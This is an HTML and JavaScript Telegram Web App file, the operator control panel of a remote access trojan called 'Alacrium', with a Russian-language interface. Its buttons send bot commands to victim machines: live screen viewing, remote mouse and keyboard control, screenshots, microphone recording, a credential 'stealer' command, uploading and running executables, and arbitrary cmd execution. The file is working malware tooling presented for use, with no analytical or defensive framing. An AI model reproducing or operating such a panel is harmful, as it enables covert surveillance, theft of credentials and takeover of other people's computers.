<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Alacrium RAT Panel</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0a0e17; color: #e0e6f0; padding: 12px; min-height: 100vh; touch-action: manipulation; }
        .container { max-width: 480px; margin: 0 auto; padding-bottom: 20px; }
        .header { display: flex; align-items: center; justify-content: space-between; padding: 10px 0 16px 0; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 16px; }
        .header h1 { font-size: 20px; font-weight: 700; background: linear-gradient(135deg, #00d4ff, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .status-badge { background: rgba(0,212,255,0.1); color: #00d4ff; font-size: 10px; font-weight: 600; padding: 4px 12px; border-radius: 20px; border: 1px solid rgba(0,212,255,0.15); }
        .card { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 14px; padding: 14px 16px; margin-bottom: 12px; }
        .card-title { font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: rgba(255,255,255,0.3); margin-bottom: 10px; }
        .btn { background: rgba(255,255,255,0.06); border: none; border-radius: 10px; padding: 10px 14px; font-size: 13px; font-weight: 500; color: #e0e6f0; cursor: pointer; transition: all 0.1s ease; display: inline-flex; align-items: center; justify-content: center; gap: 6px; width: 100%; touch-action: manipulation; -webkit-tap-highlight-color: transparent; }
        .btn:active { transform: scale(0.95); background: rgba(255,255,255,0.10); }
        .btn-primary { background: linear-gradient(135deg, #0066ff, #7b2ffc); color: #fff; font-weight: 600; }
        .btn-primary:active { background: linear-gradient(135deg, #0055dd, #6a1fcb); }
        .btn-danger { background: rgba(255,50,80,0.15); color: #ff4466; border: 1px solid rgba(255,50,80,0.1); }
        .btn-success { background: rgba(0,200,100,0.1); color: #00cc77; border: 1px solid rgba(0,200,100,0.08); }
        .btn-outline { background: transparent; border: 1px solid rgba(255,255,255,0.08); }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
        input[type="text"] { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; padding: 10px 12px; font-size: 13px; color: #e0e6f0; width: 100%; outline: none; font-family: inherit; }
        input:focus { border-color: rgba(0,102,255,0.3); }
        input::placeholder { color: rgba(255,255,255,0.2); }
        .input-row { display: flex; gap: 6px; align-items: center; }
        .input-row .btn { flex: 0 0 auto; width: auto; padding: 10px 16px; }
        .touchpad { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; height: 180px; width: 100%; position: relative; touch-action: none; cursor: pointer; overflow: hidden; margin-bottom: 8px; transition: border-color 0.2s ease; }
        .touchpad.active { border-color: rgba(0,212,255,0.3); background: rgba(0,212,255,0.03); }
        .touchpad .cursor-dot { position: absolute; width: 16px; height: 16px; background: rgba(0,212,255,0.5); border-radius: 50%; border: 2px solid rgba(0,212,255,0.8); transform: translate(-50%, -50%); pointer-events: none; box-shadow: 0 0 20px rgba(0,212,255,0.2); transition: background 0.1s ease; }
        .touchpad .cursor-dot.active { background: rgba(0,255,100,0.5); border-color: rgba(0,255,100,0.8); }
        .touchpad .center-label { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: rgba(255,255,255,0.1); font-size: 12px; letter-spacing: 1px; pointer-events: none; }
        .touchpad-controls { display: flex; gap: 6px; }
        .touchpad-controls .btn { flex: 1; font-size: 12px; padding: 8px; }
        .demo-area { width: 100%; background: #000; border-radius: 10px; overflow: hidden; margin-bottom: 8px; aspect-ratio: 16/9; display: flex; align-items: center; justify-content: center; }
        .demo-area img { width: 100%; height: 100%; object-fit: contain; }
        .demo-area .placeholder { color: rgba(255,255,255,0.2); font-size: 14px; }
        .demo-controls { display: flex; gap: 6px; }
        .demo-controls .btn { flex: 1; }
        .log { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 12px 14px; font-family: monospace; font-size: 11px; color: rgba(255,255,255,0.5); min-height: 50px; max-height: 120px; overflow-y: auto; line-height: 1.6; border: 1px solid rgba(255,255,255,0.03); white-space: pre-wrap; word-break: break-word; }
        .log::-webkit-scrollbar { width: 3px; }
        .log::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 10px; }
        .combo-btns { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 6px; }
        .combo-btns .btn { flex: 1 0 auto; min-width: 60px; padding: 6px 10px; font-size: 11px; }
        .demo-url-row { display: flex; gap: 6px; margin-top: 6px; }
        .demo-url-row input { flex: 1; }
        .demo-url-row .btn { flex: 0 0 auto; width: auto; }
        @media (max-width: 420px) { body { padding: 8px; } .card { padding: 12px; } .touchpad { height: 150px; } .btn { font-size: 12px; padding: 8px 12px; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>⚡ Alacrium</h1>
        <span class="status-badge">● LIVE</span>
    </div>

    <!-- Демонстрация экрана -->
    <div class="card">
        <div class="card-title">🖥️ Демонстрация экрана</div>
        <div class="demo-area" id="demoArea">
            <span class="placeholder">Нажмите "Start Demo"</span>
        </div>
        <div class="demo-controls">
            <button class="btn btn-success" onclick="sendCmd('/startdemo')">▶️ Start Demo</button>
            <button class="btn btn-danger" onclick="sendCmd('/stopdemo')">⏹ Stop Demo</button>
        </div>
        <div class="demo-url-row">
            <input type="text" id="demoUrl" placeholder="Вставьте URL от бота (https://...)">
            <button class="btn btn-primary" onclick="openDemo()">Открыть</button>
        </div>
    </div>

    <!-- Touchpad -->
    <div class="card">
        <div class="card-title">🖱️ Тачпад</div>
        <div id="touchpad" class="touchpad">
            <div id="cursorDot" class="cursor-dot" style="top:50%;left:50%;"></div>
            <div class="center-label">ВЕДИТЕ ПАЛЬЦЕМ</div>
        </div>
        <div class="touchpad-controls">
            <button class="btn btn-outline" onclick="sendCmd('/mouse 0 0 0')">🖱️ Левый</button>
            <button class="btn btn-outline" onclick="sendCmd('/mouse 0 0 1')">🖱️ Правый</button>
            <button class="btn btn-outline" onclick="sendCmd('/scroll 120')">⬆️</button>
            <button class="btn btn-outline" onclick="sendCmd('/scroll -120')">⬇️</button>
        </div>
    </div>

    <!-- Быстрые команды -->
    <div class="card">
        <div class="card-title">📡 Команды</div>
        <div class="grid-2">
            <button class="btn btn-primary" onclick="sendCmd('/screenshot')">📸 Скрин</button>
            <button class="btn btn-outline" onclick="sendCmd('/mic')">🎤 Микро</button>
            <button class="btn btn-outline" onclick="sendCmd('/steal')">💾 Стиллер</button>
            <button class="btn btn-outline" onclick="sendCmd('/ip')">🌐 IP</button>
        </div>
    </div>

    <!-- Клавиатура -->
    <div class="card">
        <div class="card-title">⌨️ Клавиатура</div>
        <div class="input-row">
            <input type="text" id="kbtext" placeholder="Текст или комбинация (например win+r)">
            <button class="btn btn-primary" onclick="sendKeyboard()">Ввод</button>
        </div>
        <div class="combo-btns">
            <button class="btn btn-outline" onclick="sendCmd('/keyboard win+r')">Win+R</button>
            <button class="btn btn-outline" onclick="sendCmd('/keyboard ctrl+c')">Ctrl+C</button>
            <button class="btn btn-outline" onclick="sendCmd('/keyboard ctrl+v')">Ctrl+V</button>
            <button class="btn btn-outline" onclick="sendCmd('/keyboard alt+tab')">Alt+Tab</button>
            <button class="btn btn-outline" onclick="sendCmd('/keyboard win')">Win</button>
            <button class="btn btn-outline" onclick="sendCmd('/keyboard enter')">Enter</button>
            <button class="btn btn-outline" onclick="sendCmd('/keyboard tab')">Tab</button>
            <button class="btn btn-outline" onclick="sendCmd('/keyboard esc')">Esc</button>
        </div>
    </div>

    <!-- Run -->
    <div class="card">
        <div class="card-title">📂 Запуск</div>
        <div class="input-row">
            <input type="text" id="runpath" placeholder="C:\\путь\\к\\файлу.exe">
            <button class="btn btn-success" onclick="sendRun()">▶️</button>
        </div>
        <div style="display:flex;gap:6px;margin-top:6px;">
            <button class="btn btn-outline" onclick="sendCmd('/upload')" style="flex:1;">📤 Загрузить</button>
            <button class="btn btn-success" onclick="sendCmd('/run_uploaded')" style="flex:1;">▶️ Запустить загруженный</button>
        </div>
    </div>

    <!-- Command -->
    <div class="card">
        <div class="card-title">💻 Команда (cmd)</div>
        <div class="input-row">
            <input type="text" id="cmd" placeholder="whoami / ipconfig...">
            <button class="btn btn-primary" onclick="sendCommand()">Выполнить</button>
        </div>
    </div>

    <!-- Extra -->
    <div style="display:flex;gap:6px;margin-bottom:12px;">
        <button class="btn btn-outline" onclick="sendCmd('/miniapp')" style="flex:1;">🔄 Показать кнопку</button>
        <button class="btn btn-danger" onclick="sendCmd('/exit')" style="flex:1;">⛔ Выход</button>
    </div>

    <!-- Log -->
    <div class="card" style="margin-bottom:0;">
        <div class="card-title">📋 Лог</div>
        <div id="log" class="log">Готов к работе...</div>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const logElement = document.getElementById('log');
    const touchpad = document.getElementById('touchpad');
    const cursorDot = document.getElementById('cursorDot');
    const demoArea = document.getElementById('demoArea');
    const demoImg = document.createElement('img');
    demoImg.style.display = 'none';
    demoArea.appendChild(demoImg);

    let isDragging = false;
    let startX = 0, startY = 0;
    let demoInterval = null;

    function log(msg) {
        if (logElement.textContent === 'Готов к работе...' || logElement.textContent === '') {
            logElement.textContent = '';
        }
        logElement.textContent += msg + '\n';
        logElement.scrollTop = logElement.scrollHeight;
    }

    function sendCmd(cmd) {
        if (!cmd) return;
        log('➜ ' + cmd);
        tg.sendData(cmd);
    }

    function openDemo() {
        const url = document.getElementById('demoUrl').value;
        if (!url) {
            log('⚠️ Вставьте URL');
            return;
        }
        // Показываем изображение и обновляем его каждые 200 мс
        if (demoInterval) clearInterval(demoInterval);
        demoImg.style.display = 'block';
        demoImg.src = url + '?t=' + Date.now();
        demoArea.querySelector('.placeholder').style.display = 'none';
        demoInterval = setInterval(() => {
            demoImg.src = url + '?t=' + Date.now();
        }, 200);
        log('✅ Демка отображается');
    }

    // Обработчики тачпада
    function handleTouchStart(e) {
        e.preventDefault();
        const touch = e.touches[0];
        if (!touch) return;
        startX = touch.clientX;
        startY = touch.clientY;
        isDragging = true;
        touchpad.classList.add('active');
        cursorDot.classList.add('active');
        clearTimeout(window.touchTimeout);
        window.touchTimeout = setTimeout(() => {
            if (isDragging) {
                sendCmd('/mouse 0 0 0');
                log('🖱️ Tap -> left click');
            }
        }, 200);
    }
    function handleTouchMove(e) {
        e.preventDefault();
        if (!isDragging) return;
        const touch = e.touches[0];
        if (!touch) return;
        const dx = touch.clientX - startX;
        const dy = touch.clientY - startY;
        if (Math.abs(dx) > 5 || Math.abs(dy) > 5) clearTimeout(window.touchTimeout);
        const mx = Math.round(dx * 0.8);
        const my = Math.round(dy * 0.8);
        if (mx !== 0 || my !== 0) sendCmd('/mouserel ' + mx + ' ' + my);
        const rect = touchpad.getBoundingClientRect();
        const relX = (touch.clientX - rect.left) / rect.width * 100;
        const relY = (touch.clientY - rect.top) / rect.height * 100;
        cursorDot.style.left = Math.min(100, Math.max(0, relX)) + '%';
        cursorDot.style.top = Math.min(100, Math.max(0, relY)) + '%';
        startX = touch.clientX;
        startY = touch.clientY;
    }
    function handleTouchEnd(e) {
        e.preventDefault();
        isDragging = false;
        touchpad.classList.remove('active');
        cursorDot.classList.remove('active');
        clearTimeout(window.touchTimeout);
    }
    touchpad.addEventListener('touchstart', handleTouchStart, { passive: false });
    touchpad.addEventListener('touchmove', handleTouchMove, { passive: false });
    touchpad.addEventListener('touchend', handleTouchEnd, { passive: false });
    touchpad.addEventListener('touchcancel', handleTouchEnd, { passive: false });

    let isMouseDown = false;
    touchpad.addEventListener('mousedown', (e) => {
        isMouseDown = true;
        startX = e.clientX;
        startY = e.clientY;
        touchpad.classList.add('active');
        cursorDot.classList.add('active');
    });
    touchpad.addEventListener('mousemove', (e) => {
        if (!isMouseDown) return;
        const dx = e.clientX - startX;
        const dy = e.clientY - startY;
        if (Math.abs(dx) > 5 || Math.abs(dy) > 5) {
            sendCmd('/mouserel ' + Math.round(dx * 0.8) + ' ' + Math.round(dy * 0.8));
            startX = e.clientX;
            startY = e.clientY;
        }
    });
    touchpad.addEventListener('mouseup', () => { isMouseDown = false; touchpad.classList.remove('active'); cursorDot.classList.remove('active'); });
    touchpad.addEventListener('mouseleave', () => { if (isMouseDown) { isMouseDown = false; touchpad.classList.remove('active'); cursorDot.classList.remove('active'); } });

    function sendKeyboard() {
        const text = document.getElementById('kbtext').value;
        if (text) {
            sendCmd('/keyboard ' + text);
            document.getElementById('kbtext').value = '';
        } else log('⚠️ Введите текст или комбинацию');
    }

    function sendRun() {
        const path = document.getElementById('runpath').value;
        if (path) {
            sendCmd('/run ' + path);
            document.getElementById('runpath').value = '';
        } else log('⚠️ Укажите путь');
    }

    function sendCommand() {
        const cmd = document.getElementById('cmd').value;
        if (cmd) {
            sendCmd('/exec ' + cmd);
            document.getElementById('cmd').value = '';
        } else log('⚠️ Введите команду');
    }

    log('✅ Панель загружена');
</script>
</body>
</html>
